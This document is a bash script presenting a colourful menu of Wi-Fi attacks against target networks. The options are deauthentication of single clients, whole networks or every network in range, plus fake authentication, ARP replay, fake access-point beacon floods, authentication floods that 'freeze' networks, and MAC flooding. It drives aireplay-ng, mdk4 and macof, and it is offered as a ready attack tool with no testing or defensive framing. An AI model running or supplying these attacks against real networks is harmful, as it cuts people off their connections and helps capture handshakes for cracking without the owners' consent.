#!/bin/bash
bold="\e[1;32m"        # 1               [ ✔ ]
italic="\e[3;32m"      # 3               [ X ]
underline="\e[4;32m"   # 4
blink="\e[5;32m"       # 5
highlight="\e[7;32m"   # 7
ending="\e[0m"         # 0
Red='\033[0;31m'          # Red   echo -e "\033[1;35m  \033[0m"
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='`\033[0;34m`'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'          # light blue      

echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;34m
██╗  ██╗ █████╗ ███╗   ██╗███████╗ ██████╗ 
██║  ██║██╔══██╗████╗  ██║╚══███╔╝██╔═══██╗
███████║███████║██╔██╗ ██║  ███╔╝ ██║   ██║
██╔══██║██╔══██║██║╚██╗██║ ███╔╝  ██║   ██║
██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ \e[0m"
echo ""
echo -e "\033[1;35m    +-+-+-+-+-+-+-+-+-+-+-+-+         \033[0m"
echo -e "\033[1;35m    |D|E|A|T|H| |E|S|T|H|E|R|         \033\[0m"
echo -e "\033[1;35m    +-+-+-+-+-+-+-+-+-+-+-+-+         \033\[0m"
echo ""
echo ""

echo -e "\033[1;32m [*] SELECT AN ATTACK OPTIONS\033[0m" #green bold
echo  ""
echo -e "\033[1;34m [1] DEAUTHENTICATION ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [2] FAKEAUTHENTICATION ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [3] ARP-REPLAY ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [4] FAKE ACCESSPOINTS ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [5] FROZE NETWORK ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [6] MAC FLOOD ATTACK\033[0m" #blue bold
echo ""
echo -e "\033[1;34m [7] PACKET INJECTION TEST\033[0m" #blue bold
echo ""
read -p "=> " meun

if [ $meun == "1" ]  ##            [ ✔ ]
then
clear 
echo -e "\033[1;34m
#######\                                  ##\     ##\       
##  __##\                                 ## |    ## |      
## |  ## | ######\   ######\  ##\   ##\ ######\   #######\  
## |  ## |##  __##\  \____##\ ## |  ## |\_##  _|  ##  __##\ 
## |  ## |######## | ####### |## |  ## |  ## |    ## |  ## |
## |  ## |##   ____|##  __## |## |  ## |  ## |##\ ## |  ## |
#######  |\#######\ \####### |\######  |  \####  |## |  ## |
\_______/  \_______| \_______| \______/    \____/ \__|  \__|\033[0m"
echo ""
echo -e "\033[1;34m[1] DEAUTH ON WHOLE NETWORK ONLY FOR MOBILE\033[0m" 
echo ""
echo -e "\033[1;34m[2] DEAUTH ON CLINT TO CAPTURE HANDSHAKE\033[0m"
echo ""
echo -e "\033[1;34m[3] Deauth EVERY NETWORK IN RANGE\033[0m"
echo ""
echo -e "\033[1;34m[4] DEAUTH WHOLE NETWORK BY MDK4 EVERY DEVICE\033[0m"
echo ""
read -p "SELECT AN ATTACK OPTIONS => " lol
echo ""
    if [ $lol == 1 ]
    then
        echo -e "\033[1;35m____________________\033[0m" #purple bold
        echo ""
        echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
        echo -e "\033[1;35m____________________\033[0m"
        sleep 1s
        clear
        echo -e "\e[1;35m____________________$ending" #purple
        echo ""
        echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
        echo -e "\e[1;35m____________________$ending"
        echo ""
        sudo iwconfig
        echo ""
        read -p "Enter the interface => " lan # interface
        echo ""
        read -p "Enter Target Address => " id # bssid 
        echo ""
        echo ""
        read -p "Number of deauthenticate packet sent => " deauth # deauth 
        echo -e "\e[1;33m__________________________________\e[0m"
        echo ""
        echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
        echo -e "\e[1;33m__________________________________\e[0m"
        sleep 1s
        sudo aireplay-ng $lan -a $id -0 $deauth 
    elif [ $lol == 2 ]
    then
        echo -e "\033[1;35m____________________\033[0m" #purple bold
        echo ""
        echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
        echo -e "\033[1;35m____________________\033[0m"
        sleep 1s
        clear
        echo -e "\e[1;35m____________________$ending" #purple
        echo ""
        echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
        echo -e "\e[1;35m____________________$ending"
        echo ""
        sudo iwconfig
        echo ""
        read -p "Enter the interface -> " lan # interface
        echo ""
        read -p "Enter Target Address -> " id # bssid 
        echo ""
        echo ""
        read -p "Enter Clint Address -> " clit # clint
        echo ""
        read -p "Number of deauthenticate packet sent -> " deauth # deauth 
        echo -e "\e[1;33m__________________________________\e[0m"
        echo ""
        echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
        echo -e "\e[1;33m__________________________________\e[0m"
        sleep 1s
        sudo aireplay-ng $lan -a $id -c $clit -0 $deauth
    elif [ $lol == 3 ]
    then
        echo "Deauth all clint Attack"
        which mdk4 > /dev/null         ### check install
        if [ $? -ne 0 ]
        then
            echo -e "\033[1;35m____________________\033[0m" #purple bold
            echo ""
            echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
            echo -e "\033[1;35m____________________\033[0m"
            sleep 1s
            clear
            echo -e "\e[1;35m____________________$ending" #purple
            echo ""
            echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
            echo -e "\e[1;35m____________________$ending"
            echo ""           
            iwconfig
            echo ""
            read -p "Enter your interface => " lan
            echo ""
            echo -e "\033[1;5;31mN  e e d  T o  I n s t a l l  p K g\033[0m"
            service NetworkManager restart
            sudo apt-get install mdk4
            sudo airmon-ng check kill 
            sudo airmon-ng start $lan
            echo -e "\e[1;33m__________________________________\e[0m"
            echo ""
            echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
            echo -e "\e[1;33m__________________________________\e[0m"
            sleep 1s
            echo ""
            sudo mdk4 $lan d
        else
            echo -e "\033[1;35m____________________\033[0m" #purple bold
            echo ""
            echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
            echo -e "\033[1;35m____________________\033[0m"
            sleep 1s
            clear
            echo -e "\e[1;35m____________________$ending" #purple
            echo ""
            echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
            echo -e "\e[1;35m____________________$ending"
            echo ""           
            iwconfig
            echo ""
            read -p "Enter your interface => " lan
            echo ""
            echo -e "\e[1;33m__________________________________\e[0m"
            echo ""
            echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
            echo -e "\e[1;33m__________________________________\e[0m"
            sleep 1s
            echo ""
            sudo mdk4 $lan d
        fi 
    elif [ $lol == 4 ]
    then
        echo -e "\033[1;35m____________________\033[0m" #purple bold
        echo ""
        echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
        echo -e "\033[1;35m____________________\033[0m"
        sleep 1s
        clear
        echo -e "\e[1;35m____________________$ending" #purple
        echo ""
        echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
        echo -e "\e[1;35m____________________$ending"
        echo ""
        sudo iwconfig
        echo ""
        read -p "Enter the interface -> " lan # interface
        echo ""
        read -p "Enter Target Address -> " id # bssid 
        echo ""
        read -p "Set a speed => " speedx
        echo ""
        which mdk4 > /dev/null         ### check install
        if [ $? -ne 0 ]
        then
            echo "  N  e e d  T o  I n s t a l l  p K g"
            service NetworkManager restart
            sudo apt-get install mdk4 -y
            sudo airmon-ng check kill 
            sudo airmon-ng start $lan
            echo -e "\e[1;34m All good \e[0m"
            echo -e "\e[1;33m__________________________________\e[0m"
            echo ""
            echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
            echo -e "\e[1;33m__________________________________\e[0m"
            sleep 1s
            sudo mdk4 $lan d -B $id -s $speedx
        else
            echo -e "\e[1;33m__________________________________\e[0m"
            echo ""
            echo -e "\e[7;33m D E A U T H E N T I C A T I N G \e[0m"
            echo -e "\e[1;33m__________________________________\e[0m"
            sleep 1s
            sudo mdk4 $lan d -B $id -s $speedx
        fi
    else
    exit
    fi

elif [ $meun == "2" ]    ##            [ ✔ ]
then
echo -e "\e[1;5;35m███████╗  █████╗  ██╗  ██╗ ███████╗  █████╗  ██╗   ██╗ ████████╗ ██╗  ██╗\e[0m"
echo -e "\e[1;5;35m██╔════╝ ██╔══██╗ ██║ ██╔╝ ██╔════╝ ██╔══██╗ ██║   ██║ ╚══██╔══╝ ██║  ██║\e[0m"
echo -e "\e[1;5;35m█████╗   ███████║ █████╔╝  █████╗   ███████║ ██║   ██║    ██║    ███████║\e[0m"
echo -e "\e[1;5;35m██╔══╝   ██╔══██║ ██╔═██╗  ██╔══╝   ██╔══██║ ██║   ██║    ██║    ██╔══██║\e[0m"
echo -e "\e[1;5;35m██║      ██║  ██║ ██║  ██╗ ███████╗ ██║  ██║ ╚██████╔╝    ██║    ██║  ██║\e[0m"
echo -e "\e[1;5;35m╚═╝      ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝    ╚═╝  ╚═╝\e[0m"
echo ""
echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;35m____________________$ending" #purple
echo ""
echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
echo -e "\e[1;35m____________________$ending"
echo ""
sudo iwconfig
sleep 1s
echo ""
read -p "Enter your Interface here -> " lan  # $lan
echo ""
echo -e "\0033[1;35m__________________________\e[0m" #purple
echo ""
echo -e "\0033[1;5;35m checking  mac address  \e[0m"
echo -e "\0033[1;35m__________________________\e[0m"
sleep 1s
echo ""
sudo macchanger -s $lan
echo ""
read -p " Enter Target bssid => " id # bssid
echo ""
read  -p " Enter you mac address => " macx
echo ""
read -p " NO. of Fakeauth u want (0 - 1000 ) => " fke
echo ""
read -p "Would u like to give Essid (yes / no ) => " billi
echo ""
    if [ $billi == "yes" ]
    then
        read -p " Enter Target essid => " esidx
        echo ""
        echo -e "\e[1;33m_____________________________________\e[0m"
        echo ""
        echo -e "\e[7;33m F A K E A U T H E N T I C A T I N G \e[0m"
        echo -e "\e[1;33m_____________________________________\e[0m"
        sleep 3s
        sudo aireplay-ng $lan --fakeauth $fke -a $id -h $macx -e $esidx
    elif [ $billi == "no" ]
    then
        echo ""
        echo -e "\e[1;33m_____________________________________\e[0m"
        echo ""
        echo -e "\e[7;33m F A K E A U T H E N T I C A T I N G \e[0m"
        echo -e "\e[1;33m_____________________________________\e[0m"
        sleep 3s
        sudo aireplay-ng $lan --fakeauth $fke -a $id -h $macx 
    else
        exit
    fi
elif [ $meun == "3" ]               ############### [ X ]
then
echo -e "\e[1;36m
 ______     ______     ______      ______     ______     ______   __         ______     __  __    
/\  __ \   /\  == \   /\  == \    /\  == \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \_\ \   
\ \  __ \  \ \  __<   \ \  _-/    \ \  __<   \ \  __\   \ \  _-/ \ \ \____  \ \  __ \  \ \____ \  
 \ \_\ \_\  \ \_\ \_\  \ \_\       \ \_\ \_\  \ \_____\  \ \_\    \ \_____\  \ \_\ \_\  \/\_____\ 
  \/_/\/_/   \/_/ /_/   \/_/        \/_/ /_/   \/_____/   \/_/     \/_____/   \/_/\/_/   \/_____/ 
                                                                                                  \e[0m"                                        ################### Chnage color #############

echo ""
echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;35m____________________$ending" #purple
echo ""
echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
echo -e "\e[1;35m____________________$ending"
echo ""
sudo iwconfig
sleep 1s
echo ""
read -p "Enter your Interface here -> " lan  # $lan
echo ""
read -p "Enter Target bssid => " id # bssid
echo ""
echo -e "\0033[1;35m__________________________\e[0m" #purple
echo ""
echo -e "\0033[1;5;35m checking  mac address  \e[0m"
echo -e "\0033[1;35m__________________________\e[0m"
sleep 1s
echo -e ""
sudo macchanger -s $lan
echo ""
read -p "Enter you mac address => " macx
echo ""
clear
echo -e "\e[1;33m______________________________\e[0m"     ####### color ####
echo ""
echo -e "\e[7;33m A I R E P L A Y  A T T A C K \e[0m"
echo -e "\e[1;33m______________________________\e[0m"
sleep 2s
echo ""
sudo aireplay-ng --arpreplay -b $id -h $macx $lan
###
elif [ $meun == "4" ]
then
    echo -e "Fake AKE ACCESSPOINTSesspoint AttaATTACKeacon"
    echo ""    
    echo -e "\e[1;5;34m███████╗ █████╗ ██╗  ██╗███████╗  █████╗  ██████╗ ██████╗███████╗███████╗███████╗ ██████╗  ██████╗ ██╗███╗   ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\e[0m"
    echo -e "\e[1;5;34m██╔════╝██╔══██╗██║ ██╔╝██╔════╝ ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝ ██╔══██╗██╔═══██╗██║████╗  ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\e[0m"
    echo -e "\e[1;5;34m█████╗  ███████║█████╔╝ █████╗   ███████║██║     ██║     █████╗  ███████╗███████╗ ██████╔╝██║   ██║██║██╔██╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████╔╝ \e[0m"
    echo -e "\e[1;5;34m██╔══╝  ██╔══██║██╔═██╗ ██╔══╝   ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║ ██╔═══╝ ██║   ██║██║██║╚██╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ \e[0m"
    echo -e "\e[1;5;34m██║     ██║  ██║██║  ██╗███████╗ ██║  ██║╚██████╗╚██████╗███████╗███████║███████║ ██║     ╚██████╔╝██║██║ ╚████║   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\e[0m"
    echo -e "\e[1;5;34m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ ╚═╝      ╚═════╝ ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\e[0m"
    echo ""
    echo -e "\033[1;35m____________________\033[0m" #purple bold
    echo ""
    echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
    echo -e "\033[1;35m____________________\033[0m"
    sleep 1s
    clear
    echo -e "\e[1;35m____________________$ending" #purple
    echo ""
    echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
    echo -e "\e[1;35m____________________$ending"
    echo ""
    iwconfig
    echo ""
    read -p "Enter the Interface => " lan
    echo ""
    which mdk4 > /dev/null         ### check install
        if [ $? -ne 0 ]
        then
            echo -e "\e[1;35m______________________________________$ending" #purple
            echo ""
            echo -e "\e[7;31m N  e e d  T o  I n s t a l l  p K g  $ending " #highlight red
            echo -e "\e[1;35m______________________________________$ending"
            efjoawiefef=$(service NetworkManager restart)
            ewfwaef=$(sudo apt-get install mdk4 -y)
            efwefaefw=$(sudo airmon-ng check kill )
            r33r3r=$(sudo airmon-ng start $lan)
            clear
            echo -e "\e[1;34m [1] Clone acesspointb using a given wordlist \e[0m"
            echo ""
            echo -e "\e[1;34m [2] Clone accesspoint by  Bssid or Name \e[0m"
            echo ""
            echo -e "\e[1;34m [3] To Generate Random accessponit \e[0m"
            echo ""
            sleep 2s
            read -p "Select Attack type => " filexn
                if [ $filexn == "1" ]  ####### conditon satisfy
                then
                read -p "Enter Wordlist path => " pathx
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b -f $pathx
                elif [ $filexn == "2" ]       #### done condition
                then
                read -p "Enter Name or Bssid => " self
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b -n $self                    
                elif [ $filexn == "3" ]       #### done condition
                then
                echo "Taking random"
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b 
                else
                exit
                fi
        else        
            echo -e "\e[1;34m [1] Clone acesspointb using a given wordlist \e[0m"
            echo ""
            echo -e "\e[1;34m [2] Clone accesspoint by  Bssid or Name \e[0m"
            echo ""
            echo -e "\e;[1;34m [3] To Generate Random accessponit \e[0m"
            sleep 2s
            read -p "Select Attack type => " filexn
                if [ $filexn == "1" ]  ####### conditon satisfy
                then
                read -p "Enter your file Location / path => " pathx
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b -f $pathx
                elif [ $filexn == "2" ]       #### done condition
                then
                read -p "Enter Name or Bssid => " self
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b -n $self                    
                elif [ $filexn == "3" ]
                then
                echo "Taking random"
                echo ""
                echo -e "\e[1;33m_________________________________\e[0m"
                echo ""
                echo -e "\e[7;33m F A K E  A C C E S S  P O I N T \e[0m"
                echo -e "\e[1;33m_________________________________\e[0m"
                sudo mdk4 $lan b  ### complet random
                else
                exit
                fi 
        fi
elif [ $meun == 5 ]
then
echo -e "\e[1;34m
  █████▒██▀███   ▒█████  ▒███████▒▓█████ 
▓██   ▒▓██ ▒ ██▒▒██▒  ██▒▒ ▒ ▒ ▄▀░▓█   ▀ 
▒████ ░▓██ ░▄█ ▒▒██░  ██▒░ ▒ ▄▀▒░ ▒███   
░▓█▒  ░▒██▀▀█▄  ▒██   ██░  ▄▀▒   ░▒▓█  ▄ 
░▒█░   ░██▓ ▒██▒░ ████▓▒░▒███████▒░▒████▒
 ▒ ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▒ ▓░▒░▒░░ ▒░ ░
 ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒ ▒ ░ ▒ ░ ░  ░
 ░ ░     ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ░ ░   ░   
          ░         ░ ░    ░ ░       ░  ░
                         ░                \e[0m"
echo ""
echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;35m____________________$ending" #purple
echo ""
echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
echo -e "\e[1;35m____________________$ending"
echo ""
sleep 1s
ifconfig
echo ""
read -p "Enter your interface name => " lan
echo ""
echo ""
echo -e "\e[1;34m[1] Froze a Paticular Network\e[0m"
echo ""
echo -e "\e[1;34m[2] Froze every network in range\e[0m"
echo ""
read -p  "=> " frozas
echo ""
    if  [ $frozas == 1 ]
    then
    which mdk4 > /dev/null         ### check install
        if [ $? -ne 0 ]
        then
            echo ""
            efef=$(service NetworkManager restart)
            efwaeefzzz=$(sudo apt install mdk4 -y)
            echo ""
            read -p "Enter target mac address => " kitten
            echo -e "\e[1;33m_______________\e[0m"
            echo ""
            echo -e "\e[7;33m   F R O Z E   \e[0m"
            echo -e "\e[1;33m_______________\e[0m"
            sudo mdk4 $lan a -a $kitten
        else
            echo ""
            read -p "Enter target mac address => " kitten
            read -p "Enter target mac address => " kitten
            echo -e "\e[1;33m_______________\e[0m"
            echo ""
            echo -e "\e[7;33m   F R O Z E   \e[0m"
            echo -e "\e[1;33m_______________\e[0m"
            sudo mdk4 $lan a -a $kitten
        fi
    elif [ $frozas == 2 ]
    then 
    which mdk4 > /dev/null         ### check install
        if [ $? -ne 0 ]
        then
            echo ""
            eqfqefef=$(service NetworkManager restart)
            ugiuhi=$(sudo apt install mdk4)
            read -p "Enter target mac address => " kitten
            echo -e "\e[1;33m_______________\e[0m"
            echo ""
            echo -e "\e[7;33m   F R O Z E   \e[0m"
            echo -e "\e[1;33m_______________\e[0m"
            sudo mdk4 $lan a 
        else
            echo ""
            read -p "Enter target mac address => " kitten
            echo -e "\e[1;33m_______________\e[0m"
            echo ""
            echo -e "\e[7;33m   F R O Z E   \e[0m"
            echo -e "\e[1;33m_______________\e[0m"
            sudo mdk4 $lan a 
        fi
    else 
        exit
    fi
elif [ $meun == 6 ]  # [ ✔ ]
then
echo -e "\e[1;34m
##\      ##\                       ######\  ##\                           ##\ 
###\    ### |                     ##  __##\ ## |                          ## |
####\  #### | ######\   #######\  ## /  \__|## | ######\   ######\   ####### |
##\##\## ## | \____##\ ##  _____| ####\     ## |##  __##\ ##  __##\ ##  __## |
## \###  ## | ####### |## /       ##  _|    ## |## /  ## |## /  ## |## /  ## |
## |\#  /## |##  __## |## |       ## |      ## |## |  ## |## |  ## |## |  ## |
## | \_/ ## |\####### |\#######\  ## |      ## |\######  |\######  |\####### |
\__|     \__| \_______| \_______| \__|      \__| \______/  \______/  \_______| \e[0m"
echo ""
echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;35m____________________$ending" #purple
echo ""
echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
echo -e "\e[1;35m____________________$ending"
echo ""
sleep 1s
ifconfig
echo ""
read -p "Enter your interface name => " lan
which macof > /dev/null
    if [ $? -ne 0 ]
    then
        echo -e "\e[1;35m______________________________________$ending" #purple
        echo ""
        echo -e "\e[7;31m N  e e d  T o  I n s t a l l  p K g  $ending " #highlight red
        echo -e "\e[1;35m______________________________________$ending"
        kpokp=$(service NetworkManager restart)
        wfqeftg=$(sudo apt-get install dnsiff)
        clear
        echo -e "\e[1;33m_____________________\e[0m"
        echo ""
        echo -e "\e[7;33m   M A C  F L O O D  \e[0m"
        echo -e "\e[1;33m_____________________\e[0m"
        sudo macof -i $lan
    else
        echo -e "\e[1;33m_____________________\e[0m"
        echo ""
        echo -e "\e[7;33m   M A C  F L O O D  \e[0m"
        echo -e "\e[1;33m_____________________\e[0m"
        sudo macof -i $lan
    fi 
elif [ $meun == 7 ]
then
echo -e "\e[1;34m
██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗    ████████╗███████╗███████╗████████╗
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██████╔╝███████║██║     █████╔╝ █████╗     ██║       ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║       ██║   █████╗  ███████╗   ██║   
██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║       ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║       ██║   ██╔══╝  ╚════██║   ██║   
██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║       ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║       ██║   ███████╗███████║   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
                                                                                                                                                               
\e[0m"
echo ""
echo -e "\033[1;35m____________________\033[0m" #purple bold
echo ""
echo -e "\033[5;33m  S T A R T I N G  \033[0m" #yellow + blink
echo -e "\033[1;35m____________________\033[0m"
sleep 1s
clear
echo -e "\e[1;35m____________________$ending" #purple
echo ""
echo -e "\e[7;31m SELECT INTERFACEE  $ending " #highlight red
echo -e "\e[1;35m____________________$ending"
echo ""
ifconfig
echo ""
read -p "Enter your interface => " lan
echo ""
read -p "Enter target bssid  => " dead
sudo aireplay-ng $lan -9 -a $dead 
else
exit 
fi           